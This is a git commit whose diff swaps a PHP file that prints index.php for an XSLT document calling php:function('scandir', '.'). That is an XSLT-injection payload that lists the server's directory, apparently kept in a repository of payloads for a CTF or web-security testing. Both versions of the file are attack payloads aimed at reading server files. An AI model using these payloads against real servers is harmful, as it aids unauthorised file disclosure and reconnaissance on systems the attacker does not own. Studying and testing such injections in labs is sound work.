b39bbc19b633701e4ca4d8736572ca30f50d0988
DrX <57175701+Sadoth@users.noreply.github.com>
2021-06-14 08:24:46 +0200

    Update drx_lang.php

--- drx_lang.php
+++ drx_lang.php
@@ -1,3 +1,6 @@
-<?php
-    echo file_get_contents("index.php");
-?>
+<?xml version="1.0" encoding="UTF-8"?>
+<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
+<body>
+<xsl:value-of select="php:function('scandir', '.')" />
+</body>
+</html>
